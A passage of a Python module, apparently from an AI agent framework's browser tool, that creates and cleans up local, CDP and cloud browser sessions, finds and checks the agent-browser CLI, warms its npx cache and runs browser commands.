# ============================================================================

def _create_local_session(task_id: str) -> Dict[str, str]:
    import uuid
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""
    import uuid
    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, _sanitize_url_for_logs(cdp_url), task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _provider_cleanup_key(
    task_id: str,
    provider: Any,
    session_id: str,
) -> Tuple[str, int, str]:
    return (task_id, id(provider) if provider is not None else 0, session_id)


def _remember_pending_provider_cleanup(
    task_id: str,
    provider: Any,
    session_id: str,
) -> None:
    bare_task_id = _bare_task_id_for_session_key(task_id)
    record = _PendingProviderCleanup(bare_task_id, provider, session_id)
    with _cleanup_lock:
        # One provider session has exactly one retry owner. A legacy record may
        # initially lack a provider object and later resolve one; replace that
        # record instead of accumulating duplicate close attempts.
        stale_keys = [
            key
            for key, pending in _pending_provider_cleanups.items()
            if pending.task_id == bare_task_id
            and pending.session_id == session_id
        ]
        for key in stale_keys:
            _pending_provider_cleanups.pop(key, None)
        _pending_provider_cleanups[
            _provider_cleanup_key(bare_task_id, provider, session_id)
        ] = record
        # A late stale creator can finish after terminal cleanup already
        # reported no published session and moved to RETIRED. If disposing its
        # provider session then fails, reopen only the cleanup state (never the
        # browser command surface) and make the retry visible to the reaper.
        if _task_state_locked(bare_task_id) is BrowserTaskState.RETIRED:
            _set_task_state_locked(
                bare_task_id,
                BrowserTaskState.RETIRING,
                cleanup_reason=BrowserCleanupReason.TERMINAL,
            )
        _session_last_activity.setdefault(bare_task_id, time.time())


def _clear_pending_provider_cleanup(task_id: str, session_id: str) -> None:
    bare_task_id = _bare_task_id_for_session_key(task_id)
    with _cleanup_lock:
        stale_keys = [
            key
            for key, record in _pending_provider_cleanups.items()
            if record.task_id == bare_task_id and record.session_id == session_id
        ]
        for key in stale_keys:
            _pending_provider_cleanups.pop(key, None)


def _attempt_provider_session_close(
    task_id: str,
    provider: Any,
    session_id: str,
) -> bool:
    """Close a provider session once and retain identity on any failure."""
    bare_task_id = _bare_task_id_for_session_key(task_id)
    owner = provider
    if owner is None:
        try:
            owner = _get_cloud_provider()
        except Exception as exc:
            logger.warning("Could not resolve cloud browser provider for cleanup: %s", exc)
    if owner is None:
        _remember_pending_provider_cleanup(bare_task_id, provider, session_id)
        return False
    try:
        closed = owner.close_session(session_id)
    except Exception as exc:
        logger.warning("Could not close cloud browser session: %s", exc)
        _remember_pending_provider_cleanup(bare_task_id, owner, session_id)
        return False
    if closed is not True:
        logger.warning("Cloud browser provider did not confirm session close")
        _remember_pending_provider_cleanup(bare_task_id, owner, session_id)
        return False
    _clear_pending_provider_cleanup(bare_task_id, session_id)
    return True


def _dispose_unpublished_session(
    task_id: str,
    session_info: Any,
    provider: Any = None,
) -> bool:
    """Dispose resources created by a stale or losing session creator."""
    if not isinstance(session_info, dict):
        return True
    session_id = session_info.get("bb_session_id")
    if not session_id:
        # Local and shared-CDP candidates are metadata-only until their first
        # command, so there is no daemon or target to release before publication.
        return True
    owner = session_info.get("_provider_cleanup_owner", provider)
    return _attempt_provider_session_close(task_id, owner, str(session_id))


def _abandon_session_creation(
    bare_task_id: str,
    generation: int,
) -> None:
    """Return a failed creator's STARTING state to ACTIVE when still current."""
    with _cleanup_lock:
        if (
            _task_generation_locked(bare_task_id) == generation
            and _task_state_locked(bare_task_id) is BrowserTaskState.STARTING
            and not _task_has_active_sessions_locked(bare_task_id)
        ):
            _set_task_state_locked(bare_task_id, BrowserTaskState.ACTIVE)


def _get_session_info(
    task_id: Optional[str] = None,
    *,
    _for_cleanup: bool = False,
) -> Dict[str, Any]:
    """
    Get or create session info for the given session key.

    In cloud mode, creates a Browserbase session with proxies enabled.
    In local mode, generates a session name for agent-browser --session.
    Also starts the inactivity cleanup thread and updates activity tracking.
    Thread-safe: multiple subagents can call this concurrently.

    Args:
        task_id: Session key.  Normally the task_id as-is, but may carry the
            ``::local`` suffix for the hybrid-routing local sidecar — in that
            case the cloud provider is skipped even when one is configured,
            and a local Chromium session is created instead.

    Returns:
        Dict with session_name (always), bb_session_id + cdp_url (cloud only)
    """
    if task_id is None:
        task_id = "default"
    bare_task_id = _bare_task_id_for_session_key(task_id)

    # Start the cleanup thread if not running (handles inactivity timeouts)
    _start_browser_cleanup_thread()

    with _cleanup_lock:
        state = _task_state_locked(bare_task_id)
        existing_session = _active_sessions.get(task_id)
        cleanup_lookup = (
            _for_cleanup
            and state is BrowserTaskState.RETIRING
            and existing_session is not None
        )
        if state in {BrowserTaskState.RETIRING, BrowserTaskState.RETIRED} and not cleanup_lookup:
            raise _BrowserSessionRetiredError(task_id)
        if not _for_cleanup:
            # Update activity and read ownership in one critical section so a
            # cleanup cannot retire the task between those operations.
            _session_last_activity[task_id] = time.time()

    if existing_session is not None:
        if _for_cleanup or not _session_has_expired(existing_session):
            return existing_session

        logger.info(
            "Replacing expired cloud browser session for task %s",
            task_id,
        )
        if not _cleanup_browser_session_keys(
            task_id,
            [task_id],
            reason=BrowserCleanupReason.PROVIDER_EXPIRY,
        ):
            raise _BrowserSessionRetiredError(task_id)
        return _get_session_info(task_id)

    if _for_cleanup:
        raise _BrowserSessionRetiredError(task_id)

    with _cleanup_lock:
        # Recheck after the unlocked expiry/lookup path. Terminal cleanup may
        # have advanced the generation while this creator was entering.
        state = _task_state_locked(bare_task_id)
        if state in {BrowserTaskState.RETIRING, BrowserTaskState.RETIRED}:
            raise _BrowserSessionRetiredError(task_id)
        winner = _active_sessions.get(task_id)
        if winner is not None:
            return winner
        creation_generation = _task_generation_locked(bare_task_id)
        if not _task_has_active_sessions_locked(bare_task_id):
            _set_task_state_locked(bare_task_id, BrowserTaskState.STARTING)

    # Hybrid routing: session keys ending with ``::local`` force a local
    # Chromium regardless of the globally-configured cloud provider.  Public
    # URLs in the same conversation continue to use the cloud session under
    # the bare task_id key.
    force_local = _is_local_sidecar_key(task_id)

    # Create session outside the lock (network call in cloud mode). Publication
    # below is fenced by the bare-task generation captured above.
    provider = None
    session_info: Dict[str, Any]
    try:
        cdp_override = _get_cdp_override()
        if cdp_override and not force_local:
            session_info = _create_cdp_session(task_id, cdp_override)
        elif force_local:
            session_info = _create_local_session(task_id)
        else:
            provider = _get_cloud_provider()
            if provider is None:
                session_info = _create_local_session(task_id)
            else:
                provider_candidate: Any = None
                try:
                    provider_candidate = provider.create_session(task_id)
                    if not provider_candidate or not isinstance(provider_candidate, dict):
                        raise ValueError(
                            "Cloud provider returned invalid session: "
                            f"{provider_candidate!r}"
                        )
                    session_info = dict(provider_candidate)
                    session_info["_provider_cleanup_owner"] = provider
                    if session_info.get("cdp_url"):
                        # Some providers return an HTTP discovery URL instead
                        # of a raw websocket endpoint.
                        session_info["cdp_url"] = _resolve_cdp_override(
                            str(session_info["cdp_url"])
                        )
                except Exception as exc:
                    _dispose_unpublished_session(
                        task_id,
                        provider_candidate,
                        provider,
                    )
                    provider_name = type(provider).__name__
                    logger.warning(
                        "Cloud provider %s failed (%s); attempting fallback to "
                        "local Chromium for task %s",
                        provider_name,
                        exc,
                        task_id,
                        exc_info=True,
                    )
                    try:
                        session_info = _create_local_session(task_id)
                    except Exception as local_error:
                        raise RuntimeError(
                            f"Cloud provider {provider_name} failed ({exc}) and local "
                            f"fallback also failed ({local_error})"
                        ) from exc
                    session_info = dict(session_info)
                    session_info["fallback_from_cloud"] = True
                    session_info["fallback_reason"] = str(exc)
                    session_info["fallback_provider"] = provider_name
    except BaseException:
        _abandon_session_creation(bare_task_id, creation_generation)
        raise

    with _cleanup_lock:
        current_state = _task_state_locked(bare_task_id)
        stale_creator = (
            _task_generation_locked(bare_task_id) != creation_generation
            or current_state in {
                BrowserTaskState.RETIRING,
                BrowserTaskState.RETIRED,
            }
        )
        winner = _active_sessions.get(task_id)
        if not stale_creator and winner is None:
            session_info = dict(session_info)
            session_info.setdefault("session_key", task_id)
            session_info.setdefault("owner_task_id", bare_task_id)
            session_info["_lifecycle_generation"] = creation_generation
            _active_sessions[task_id] = session_info
            _set_task_state_locked(bare_task_id, BrowserTaskState.ACTIVE)
            published = True
        else:
            published = False

    if not published:
        _dispose_unpublished_session(task_id, session_info, provider)
        if stale_creator:
            raise _BrowserSessionRetiredError(task_id)
        return winner

    # Lazy-start the CDP supervisor now that the session exists (if the
    # backend surfaces a CDP URL via override or session_info["cdp_url"]).
    # Idempotent; swallows errors. See _ensure_cdp_supervisor for details.
    # Skip for local sidecars — they have no CDP URL.
    if not force_local:
        _ensure_cdp_supervisor(
            task_id,
            expected_generation=creation_generation,
        )

    return session_info



def _agent_browser_candidate_present(path: str | None) -> bool:
    if not path:
        return False
    if " " in path and path.split()[0].endswith("npx"):
        return True
    return os.path.exists(path) and (os.name == "nt" or os.access(path, os.X_OK))


def _resolve_npx_bin() -> Optional[str]:
    """Resolve a runnable npx binary, preferring the Hermes-managed/Homebrew
    extended search over a bare ambient PATH lookup.

    Checking bare PATH first would let a broken or unrelated system npx
    shadow a healthy Hermes-managed one with no recovery — every candidate
    is therefore validated with ``node_tool_runnable`` (the same check
    ``find_hermes_node_executable`` uses to self-heal a managed Node tree)
    before being trusted, falling through to the next candidate otherwise.
    """
    extended_path = _merge_browser_path("")
    if extended_path:
        extended_npx = shutil.which("npx", path=extended_path)
        if extended_npx and node_tool_runnable(extended_npx):
            return extended_npx
    npx_path = shutil.which("npx")
    if npx_path and node_tool_runnable(npx_path):
        return npx_path
    return None


_SEMVER_TRIPLE_RE = re.compile(r"(?<!\d)(\d+)\.(\d+)\.(\d+)(?![\d-])")
_NODE_MAJOR_RE = re.compile(r"(?m)^\s*v?(\d+)(?:\.\d+){1,2}\s*$")


def _version_probe_env() -> Dict[str, str]:
    env = _build_browser_env()
    _apply_agent_browser_npm_policy(env)
    env["PATH"] = _merge_browser_path(env.get("PATH", ""))
    return env


def _probe_agent_browser_version(path: str) -> Optional[tuple[int, int, int]]:
    """Run a concrete CLI's real ``--version`` entrypoint and parse semver."""
    if not os.path.exists(path) or (os.name != "nt" and not os.access(path, os.X_OK)):
        return None
    try:
        result = subprocess.run(
            [path, "--version"],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=10,
            env=_version_probe_env(),
            creationflags=windows_hide_flags(),
            check=False,
        )
    except (OSError, subprocess.SubprocessError, ValueError):
        return None
    if result.returncode != 0:
        return None
    match = _SEMVER_TRIPLE_RE.search(f"{result.stdout}\n{result.stderr}")
    if match is None:
        return None
    return tuple(int(part) for part in match.groups())


def _effective_node_major(executable: str) -> Optional[int]:
    """Return the Node major the browser subprocess PATH would resolve."""
    env = _version_probe_env()
    search_parts = [str(Path(executable).parent)]
    search_parts.extend(part for part in env.get("PATH", "").split(os.pathsep) if part)
    search_path = os.pathsep.join(dict.fromkeys(search_parts))
    node_bin = shutil.which("node", path=search_path)
    if not node_bin:
        return None
    try:
        result = subprocess.run(
            [node_bin, "--version"],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=10,
            env=env,
            creationflags=windows_hide_flags(),
            check=False,
        )
    except (OSError, subprocess.SubprocessError, ValueError):
        return None
    if result.returncode != 0:
        return None
    match = _NODE_MAJOR_RE.search(f"{result.stdout}\n{result.stderr}")
    return int(match.group(1)) if match is not None else None


def _pin_tab_candidate_status(
    path: str,
) -> tuple[bool, Optional[tuple[int, int, int]], Optional[int]]:
    """Return compatibility plus observed CLI/Node versions for one candidate."""
    version = _probe_agent_browser_version(path)
    if version is None or version < AGENT_BROWSER_PIN_TAB_MIN_VERSION:
        return False, version, None
    node_major = _effective_node_major(path)
    return (
        node_major is not None and node_major >= AGENT_BROWSER_PIN_TAB_MIN_NODE_MAJOR,
        version,
        node_major,
    )


def _pin_tab_capability_error(node_major: Optional[int] = None) -> str:
    detected = f" Detected Node.js {node_major}." if node_major is not None else ""
    return (
        "Shared-CDP page isolation requires agent-browser >=0.34.0 and "
        f"Node.js >={AGENT_BROWSER_PIN_TAB_MIN_NODE_MAJOR}.{detected} "
        "Hermes and ordinary non-CDP browser commands remain supported on "
        "Node.js >=22.22. Use Node.js 24+ (Node.js 26 also qualifies) and "
        "install agent-browser >=0.34.0, then retry."
    )


def _find_agent_browser(*, validate: bool = True, require_pin_tab: bool = False) -> str:
    """
    Find the agent-browser CLI executable.

    Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
    node, local node_modules/.bin/, npx fallback.

    Returns:
        Path to agent-browser executable

    ``require_pin_tab`` is a fail-closed capability lookup: concrete candidates
    must report agent-browser >=0.34.0 and resolve Node >=24; the npx fallback
    is offered only under the same Node floor.

    Raises:
        FileNotFoundError: If agent-browser is not installed.
        AgentBrowserCapabilityError: If strict CDP tab pinning is unavailable.
    """
    global _cached_agent_browser, _agent_browser_resolved
    global _cached_pin_tab_agent_browser, _pin_tab_agent_browser_resolved
    global _pin_tab_failure_cache
    if (
        require_pin_tab
        and _pin_tab_agent_browser_resolved
        and _cached_pin_tab_agent_browser is not None
    ):
        return _cached_pin_tab_agent_browser
    if require_pin_tab and _pin_tab_failure_cache is not None:
        retry_at, message = _pin_tab_failure_cache
        if time.monotonic() < retry_at:
            raise AgentBrowserCapabilityError(message)
        _pin_tab_failure_cache = None
    if _agent_browser_resolved:
        if not require_pin_tab and _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or ensure npx is available in your PATH."
            )
        if not require_pin_tab:
            return _cached_agent_browser

    detected_node_major: Optional[int] = None

    def candidate_usable(path: str) -> bool:
        nonlocal detected_node_major
        if require_pin_tab:
            usable, _version, node_major = _pin_tab_candidate_status(path)
            if node_major is not None:
                detected_node_major = node_major
            return usable
        return agent_browser_runnable(path) if validate else _agent_browser_candidate_present(path)

    def cache_candidate(path: str) -> str:
        global _cached_agent_browser, _agent_browser_resolved
        global _cached_pin_tab_agent_browser, _pin_tab_agent_browser_resolved
        global _pin_tab_failure_cache
        if require_pin_tab:
            _cached_pin_tab_agent_browser = path
            _pin_tab_agent_browser_resolved = True
            _pin_tab_failure_cache = None
            if not _agent_browser_resolved:
                _cached_agent_browser = path
                _agent_browser_resolved = True
        else:
            _cached_agent_browser = path
            _agent_browser_resolved = True
        return path

    # Note: _agent_browser_resolved is set at each return site below
    # (not before the search) to prevent a race where a concurrent thread
    # sees resolved=True but _cached_agent_browser is still None.
    #
    # Every candidate below is validated with ``agent_browser_runnable`` before
    # it is cached. A bare ``shutil.which`` hit is NOT trusted: agent-browser's
    # npm postinstall re-points a global install symlink at our local
    # node_modules binary, which disappears on the next ``hermes update`` and
    # leaves a dangling link that ``which`` still reports but exec fails on with
    # exit 127 (issue #48521). Validating lets a dead candidate fall through to
    # the next working resolution (extended PATH → local .bin → npx) instead of
    # caching the broken one and silently killing every browser tool.

    # Check if it's in PATH (global install)
    which_result = shutil.which("agent-browser")
    if which_result and candidate_usable(which_result):
        if not validate:
            return which_result
        return cache_candidate(which_result)

    # Build an extended search PATH including Hermes-managed Node, macOS
    # versioned Homebrew installs, and fallback system dirs like Termux.
    extended_path = _merge_browser_path("")
    if extended_path:
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result and candidate_usable(which_result):
            if not validate:
                return which_result
            return cache_candidate(which_result)

    # Check local node_modules/.bin/ (npm install in repo root).
    # On Windows, npm drops three shims in .bin: an extensionless POSIX shell
    # script (for Git Bash / WSL), `agent-browser.cmd` (for cmd/PowerShell),
    # and `agent-browser.ps1` (for PowerShell). CreateProcess (used by Python's
    # subprocess on Windows) cannot execute the extensionless shim — it raises
    # WinError 193 "%1 is not a valid Win32 application". We must resolve to the
    # `.cmd` shim instead. `shutil.which` consults PATHEXT, so we delegate to it
    # with an explicit path so POSIX hosts still pick the extensionless shim.
    repo_root = Path(__file__).parent.parent
    local_bin_dir = repo_root / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
        if local_which and candidate_usable(local_which):
            if not validate:
                return local_which
            return cache_candidate(local_which)

    # Check common npx locations (also search the extended fallback PATH)
    npx_path = _resolve_npx_bin()
    if npx_path:
        if require_pin_tab:
            detected_node_major = _effective_node_major(npx_path)
            if (
                detected_node_major is not None
                and detected_node_major >= AGENT_BROWSER_PIN_TAB_MIN_NODE_MAJOR
            ):
                return cache_candidate(NPX_AGENT_BROWSER_SENTINEL)
        elif not validate:
            return NPX_AGENT_BROWSER_SENTINEL
        else:
            return cache_candidate(NPX_AGENT_BROWSER_SENTINEL)

    if require_pin_tab:
        message = _pin_tab_capability_error(detected_node_major)
        _pin_tab_failure_cache = (
            time.monotonic() + AGENT_BROWSER_PIN_TAB_FAILURE_TTL_SECONDS,
            message,
        )
        raise AgentBrowserCapabilityError(message)

    if not validate:
        raise FileNotFoundError("agent-browser CLI not found")

    # Nothing found — try lazy installation before giving up.
    try:
        from hermes_cli.dep_ensure import ensure_dependency
        if ensure_dependency("browser"):
            candidates = [
                shutil.which("agent-browser"),
                shutil.which("agent-browser", path=extended_path) if extended_path else None,
                shutil.which("agent-browser", path=str(get_hermes_home() / "node_modules" / ".bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node" / "bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node")),
            ]
            for recheck in candidates:
                if recheck and agent_browser_runnable(recheck):
                    _cached_agent_browser = recheck
                    _agent_browser_resolved = True
                    return recheck
    except Exception:
        pass

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or ensure npx is available in your PATH."
    )


def _kill_process_tree(proc: "subprocess.Popen") -> None:
    """Best-effort kill of *proc* and any descendants it spawned.

    ``Popen.kill()`` only signals the direct child PID. npm/npx routinely
    fork further processes (registry-fetch helpers, npm's own lifecycle
    runner, agent-browser's own detached daemon grandchild) that can survive
    a plain ``kill()`` of the top-level PID and keep a ``capture_output``-style
    pipe open, hanging the caller's ``communicate()`` past the nominal
    timeout — the same orphaned-pipe hazard already hit in production on
    POSIX (see ``tools/process_registry.py``'s ``_reader_loop``, issue
    #68915: a backgrounded grandchild inheriting a pipe's write end kept it
    from ever reaching EOF). That hazard is cross-platform, not
    Windows-specific; what *is* Windows-specific is the lack of a remedy
    other than killing the tree — anonymous pipes there don't support
    overlapped I/O, so there's no ``select()``-style non-blocking read to
    poll around a stuck grandchild the way POSIX can. Killing the whole
    process group/tree the child was launched into reaches those
    descendants on both platforms.

    Fires SIGTERM then SIGKILL back-to-back with no grace period between
    them (unlike ``tools/mcp_stdio_watchdog.py``'s ``_terminate_process_group``,
    which waits between signals because it's reacting to a live daemon being
    orphaned). By the time this is called, the caller has already burned its
    full timeout budget waiting for a graceful exit — there's nothing to gain
    from waiting again here, only more delay on an already-timed-out call.
    """
    if os.name == "nt":
        try:
            subprocess.run(
                ["taskkill", "/PID", str(proc.pid), "/T", "/F"],
                check=False,
                capture_output=True,
                stdin=subprocess.DEVNULL,
            )
        except Exception:
            pass
        return
    # os.killpg/signal.SIGKILL don't exist on Windows; this branch is
    # POSIX-only (the `os.name == "nt"` check above already returns first
    # on Windows), but resolve them defensively via getattr anyway so an
    # accidental future refactor that drops that guard degrades to a plain
    # kill() instead of AttributeError — same discipline as
    # tools/mcp_stdio_watchdog.py's _terminate_process_group.
    killpg = getattr(os, "killpg", None)
    if killpg is None:  # windows-footgun: ok - non-POSIX fallback
        try:
            proc.kill()
        except Exception:
            pass
        return
    try:
        pgid = os.getpgid(proc.pid)
    except (ProcessLookupError, OSError):
        return
    sigkill = getattr(signal, "SIGKILL", signal.SIGTERM)
    for sig in (signal.SIGTERM, sigkill):
        try:
            killpg(pgid, sig)
        except (ProcessLookupError, PermissionError, OSError):
            return


def warm_agent_browser_npx_cache(timeout: float = 60.0) -> bool:
    """Best-effort pre-fetch of the agent-browser npm package via npx.

    agent-browser is no longer a root package.json dependency (#43564) —
    it resolves lazily via ``npx agent-browser`` instead, which keeps it
    out of the npm workspace install graph entirely (nothing to prune it
    anymore) but means the first real invocation in a session would
    otherwise pay npx's registry-lookup/fetch cost. Calling this during
    ``hermes update`` (or ``hermes doctor --fix``) warms npx's own cache
    ahead of time, restoring the "available before any session starts"
    property agent-browser had while it was an eager root dependency —
    without re-entangling it with the workspace graph.

    Runs a credential-scrubbed, PATH-propagated environment matching every
    other agent-browser subprocess spawn (see ``_build_browser_env``) —
    this used to inherit the full parent environment, including every
    provider/gateway credential Hermes holds, while running registry-fetched
    npm code on every ``hermes update`` (the GHSA-m4m8-xjp4-5rmm class of
    risk ``_build_browser_env`` exists specifically to prevent). Runs in its
    own process group and kills the *whole* group — not just the top-level
    npx PID — on timeout, since a surviving descendant can otherwise hold a
    capture pipe open past the nominal deadline (see ``_kill_process_tree``).

    Fire-and-forget: never raises, always safe to call opportunistically.
    Returns True only if npx actually ran successfully (npx unavailable,
    a timeout, or a nonzero exit all return False silently).
    """
    npx_bin = _resolve_npx_bin()
    if not npx_bin:
        return False

    env = _build_browser_env()
    _apply_agent_browser_npm_policy(env)
    env["PATH"] = _merge_browser_path(env.get("PATH", ""))

    popen_kwargs: dict = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "text": True,
        "env": env,
        "creationflags": windows_hide_flags(),
    }
    if os.name == "posix":
        popen_kwargs["start_new_session"] = True
    else:
        popen_kwargs["creationflags"] |= getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)

    cmd = [
        npx_bin,
        # Defense in depth for the exact reviewed acquisition: package
        # lifecycle scripts are not needed for this version probe/warmup.
        "--ignore-scripts",
        # --prefer-offline: once cached, repeat `hermes update`/`doctor
        # --fix` runs shouldn't hit the registry just to re-confirm
        # "latest" is still latest — that would defeat the point of
        # warming the cache in the first place.
        "--prefer-offline",
        "-y",
        AGENT_BROWSER_NPX_SPEC,
        "--version",
    ]
    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, **popen_kwargs)
    except Exception:
        return False
    try:
        proc.communicate(timeout=timeout)
        return proc.returncode == 0
    except subprocess.TimeoutExpired:
        _kill_process_tree(proc)
        try:
            proc.communicate(timeout=5)
        except Exception:
            pass
        return False
    except Exception:
        _kill_process_tree(proc)
        return False


def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
    """Extract a screenshot file path from agent-browser human-readable output."""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _serialize_browser_task_command(func):
    """Fence browser subprocess dispatch against terminal task cleanup."""

    @functools.wraps(func)
    def _wrapped(
        task_id: str,
        command: str,
        args: List[str] = None,
        timeout: Optional[int] = None,
        _engine_override: Optional[str] = None,
        _allow_cleanup: bool = False,
    ) -> Dict[str, Any]:
        if _allow_cleanup:
            # Cleanup already owns the per-task operation lock.
            return func(
                task_id,
                command,
                args,
                timeout,
                _engine_override,
                _allow_cleanup=True,
            )

        bare_task_id = _bare_task_id_for_session_key(task_id or "default")
        with _task_cleanup_operation_lock(bare_task_id):
            # Close the gap where cleanup could enter RETIRING after the last
            # state check but before subprocess dispatch.
            if _is_browser_task_unavailable(task_id):
                return _browser_session_retired_result(task_id)
            return func(task_id, command, args, timeout, _engine_override)

    return _wrapped


@_serialize_browser_task_command
def _run_browser_command(
    task_id: str,
    command: str,
    args: List[str] = None,
    timeout: Optional[int] = None,
    _engine_override: Optional[str] = None,
    _allow_cleanup: bool = False,
) -> Dict[str, Any]:
    """
    Run an agent-browser CLI command using our pre-created Browserbase session.

    Args:
        task_id: Task identifier to get the right session
        command: The command to run (e.g., "open", "click")
        args: Additional arguments for the command
        timeout: Command timeout in seconds.  ``None`` reads
                 ``browser.command_timeout`` from config (default 30s).
        _engine_override: Force a specific engine for this call only.  Used
                          internally by the Lightpanda fallback to retry with
                          Chrome without touching global state.

    Returns:
        Parsed JSON response from agent-browser
    """
    # Fail before executable discovery or session lookup. This is the hard
    # boundary that prevents snapshot/click/eval/etc. from launching a daemon
    # or adopting a fresh page after cleanup retired exact target ownership.
    if not _allow_cleanup and _is_browser_task_unavailable(task_id):
        return _browser_session_retired_result(task_id)

    if timeout is None:
        timeout = _safe_command_timeout()
    args = args or []

    # Build the command
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    if _requires_real_termux_browser_install(browser_cmd):
        error = _termux_browser_install_error()
        logger.warning("browser command blocked on Termux: %s", error)
        return {"success": False, "error": error}

    # Local mode with no Chromium on disk: fail fast with an actionable
    # message instead of hanging for _command_timeout seconds per call.
    # Skip when engine=lightpanda — LP doesn't need Chromium for navigation.
    if (
        _is_local_mode()
        and not _chromium_installed()
        and _get_browser_engine() != "lightpanda"
        and not _maybe_autoinstall_chromium()
    ):
        if _running_in_docker():
            hint = (
                "Chromium browser is missing. You're running in Docker — pull "
                "the latest image to get the bundled Chromium: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chromium browser is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    from tools.interrupt import is_interrupted
    # A turn cancellation must stop new browser work, but it must not cancel
    # the exact close commands that establish the turn's ownership boundary.
    if not _allow_cleanup and is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # Get session info (creates Browserbase session with proxies if needed)
    try:
        if _allow_cleanup:
            session_info = _get_session_info(task_id, _for_cleanup=True)
        else:
            session_info = _get_session_info(task_id)
    except _BrowserSessionRetiredError:
        # Covers a cleanup racing between the early check above and lookup.
        return _browser_session_retired_result(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}

    # Session creation/publication happens outside the lifecycle lock. Cleanup
    # may have entered RETIRING immediately after publication, so recheck before
    # any capability probe, daemon spawn, or browser command dispatch.
    if not _allow_cleanup and _is_browser_task_unavailable(task_id):
        return _browser_session_retired_result(task_id)

    task_owned_shared_cdp = _is_task_owned_shared_cdp_session(session_info)
    if task_owned_shared_cdp:
        try:
            browser_cmd = _find_agent_browser(require_pin_tab=True)
        except AgentBrowserCapabilityError as exc:
            logger.warning("browser CDP command blocked: %s", exc)
            return {
                "success": False,
                "error": str(exc),
                "code": "pin_tab_unavailable",
                "data": {
                    "required_agent_browser": ">=0.34.0",
                    "required_node": ">=24",
                    "non_cdp_available": True,
                },
            }

    # Build the command with the appropriate backend flags.
    # CDP mode: the per-task named session pins one target on the shared endpoint.
    # Local mode: --session <name> launches a local headless Chromium.
    # The rest of the command (--json, command, args) is identical.
    if task_owned_shared_cdp:
        # agent-browser 0.34+ supports this combination: --pin-tab persists a
        # target binding for the named session instead of adopting another tab.
        backend_args = [
            "--session",
            session_info["session_name"],
            "--cdp",
            session_info["cdp_url"],
            "--pin-tab",
        ]
    elif session_info.get("cdp_url"):
        # Provider-backed browsers retain the pre-pinning contract: their
        # provider session owns the remote browser, so generic --cdp support is
        # sufficient and must remain compatible with Node 22/agent-browser 0.26.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch Chromium (headless by default, headed when configured)
        backend_args = ["--session", session_info["session_name"]]
        if _is_headed_mode():
            backend_args.append("--headed")

    # Lightpanda engine injection (local mode only, agent-browser v0.25.3+).
    # Use the resolved session backend rather than global cloud-provider state:
    # hybrid private-URL routing can create a local sidecar while a cloud
    # provider remains configured for public URLs.
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not _is_camofox_mode() and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    # Keep concrete executable paths intact, even when they contain spaces.
    # Only the synthetic npx fallback needs to expand into multiple argv items.
    # Resolve via the same PATH + extended-PATH cascade _find_agent_browser
    # uses (see the chrome-fallback call site above for why a bare
    # shutil.which("npx") is wrong here).
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _npx_bin = _resolve_npx_bin() or "npx"
        # --ignore-scripts: see _run_chrome_fallback_command's identical comment.
        npx_spec = (
            AGENT_BROWSER_PIN_TAB_NPX_SPEC
            if task_owned_shared_cdp
            else AGENT_BROWSER_NPX_SPEC
        )
        cmd_prefix = [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", npx_spec]
    else:
        cmd_prefix = [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + [
        "--json",
        command
    ] + args

    try:
        # Give each task its own socket directory to prevent concurrency conflicts.
        # Without this, parallel workers fight over the same default socket path,
        # causing "Failed to create socket directory: Permission denied" errors.
        task_socket_dir = os.path.join(
            _socket_safe_tmpdir(),
            f"agent-browser-{session_info['session_name']}"
        )
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        # Record this hermes PID as the session owner (cross-process safe
        # orphan detection — see _write_owner_pid).
        _write_owner_pid(task_socket_dir, session_info['session_name'])
        if task_owned_shared_cdp:
            _write_shared_cdp_endpoint(
                task_socket_dir,
                session_info["session_name"],
                str(session_info.get("cdp_url") or ""),
            )
